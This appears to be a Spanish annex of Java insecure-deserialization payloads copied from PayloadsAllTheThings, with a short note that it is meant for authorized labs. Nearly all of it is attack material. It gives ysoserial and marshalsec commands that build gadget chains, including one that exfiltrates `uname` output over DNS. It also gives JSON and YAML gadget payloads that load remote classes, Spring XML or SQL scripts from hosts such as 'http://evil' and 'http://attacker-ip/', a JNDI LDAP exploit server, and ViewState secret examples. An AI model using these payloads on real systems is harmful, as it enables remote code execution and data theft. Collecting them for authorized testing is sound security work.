# Deserialización insegura: anexo de ejemplos de PayloadsAllTheThings

> **Uso:** elegir el bloque que corresponde al motor, versión y punto de entrada. Las líneas de un bloque pueden ser alternativas. Sustituir hosts, rutas, identificadores y dominios por los del laboratorio o alcance autorizado. Los ejemplos originales son referencias de sintaxis, no pruebas verificadas contra el objetivo.

**Documento de origen:** [Insecure Deserialization/Java.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a/Insecure%20Deserialization/Java.md), revisión fija 3ac27901c711. **Licencia:** [MIT de Swissky](../../LICENCIA_PATT.md).

[← Índice de anexos](Catalogo_PATT.md) · [← Guía principal](README.md)

## 1. Java Deserialization / Detection

### Variantes presentes en tablas o texto del apartado

```text
Content-Type
```

## 2. Herramientas / Ysoserial

```java
java -jar ysoserial.jar CommonsCollections1 calc.exe > commonpayload.bin
java -jar ysoserial.jar Groovy1 calc.exe > groovypayload.bin
java -jar ysoserial.jar Groovy1 'ping 127.0.0.1' > payload.bin
java -jar ysoserial.jar Jdk7u21 bash -c 'nslookup `uname`.[redacted]' | gzip | base64
```

## 3. Herramientas / Alternativa Tooling

```java
  java -jar ysoserial.jar URLDNS http://xx.yy > yss_base.bin
  python deserek.py yss_base.bin --format python > yss_url.py
  python yss_url.py yss_new.bin
  java -cp JavaSerializationTestSuite DeSerial yss_new.bin
```

```java
  $ java -cp marshalsec.jar marshalsec.<Marshaller> [-a] [-v] [-t] [<gadget_type> [<arguments...>]]
  $ java -cp marshalsec.jar marshalsec.JsonIO Groovy "cmd" "/c" "calc"
  $ java -cp marshalsec.jar marshalsec.jndi.LDAPRefServer http://localhost:8000\#exploit.JNDIExploit 1389
  // -a - generates/tests all payloads for that marshaller
  // -t - runs in test mode, unmarshalling the generated payloads after generating them.
  // -v - verbose mode, e.g. also shows the generated payload in test mode.
  // gadget_type - Identifier of a specific gadget, if left out will display the available ones for that specific marshaller.
  // arguments - Gadget specific arguments
```

## 4. Java Deserialization / JSON Deserialization

```java
Validation failed: Unhandled Java exception: com.fasterxml.jackson.databind.exc.MismatchedInputException: Unexpected token (START_OBJECT), expected START_ARRAY: need JSON Array to contain As.WRAPPER_ARRAY type information for class java.lang.Object
```

```json
  {
    "param": [
      "com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl",
      {
        "transletBytecodes": [
          "yv66v[JAVA_CLASS_B64_ENCODED]AIAEw=="
        ],
        "transletName": "a.b",
        "outputProperties": {}
      }
    ]
  }
```

```json
  {
    "param": [
      "org.springframework.context.support.FileSystemXmlApplicationContext",
      "http://evil/spel.xml"
    ]
  }
```

```json
  [
    "ch.qos.logback.core.db.DriverManagerConnectionSource", 
    {
      "url":"jdbc:h2:mem:;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM 'http://localhost:8000/inject.sql'"
    }
  ]
```

```json
  [
    "org.apache.commons.dbcp2.cpdsadapter.DriverAdapterCPDS",
    {
      "url":"jdbc:h2:mem:;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM 'http://evil:3333/exec.sql'"
    }
  ]
```

```json
    [
      "br.com.anteros.dbcp.AnterosDBCPConfig",
      {
        "healthCheckRegistry": "ldap://{{interactsh-url}}"
      }
    ]
```

## 5. Java Deserialization / YAML Deserialization

```yaml
!!javax.script.ScriptEngineManager [
  !!java.net.URLClassLoader [[
    !!java.net.URL ["http://attacker-ip/"]
  ]]
]
```

## 6. ViewState / Storage

### Variantes presentes en tablas o texto del apartado

```text
javax.faces.STATE_SAVING_METHOD
value="-XXX:-XXXX"
base64 + gzip + Java Object
```

## 7. ViewState / Encryption

```xml
<param-name>org.apache.myfaces.MAC_ALGORITHM</param-name>   
<param-name>org.apache.myfaces.SECRET</param-name>   
<param-name>org.apache.myfaces.MAC_SECRET</param-name>
```

### Variantes presentes en tablas o texto del apartado

```text
NzY1NDMyMTA3NjU0MzIxMA==
NzY1NDMyMTA=<
MDEyMzQ1Njc4OTAxMjM0NTY3ODkwMTIz
NzY1NDMyMTA3NjU0MzIxMA
```

---

[← Índice de anexos](Catalogo_PATT.md) · [← Guía principal](README.md) · [Licencia de origen](../../LICENCIA_PATT.md)
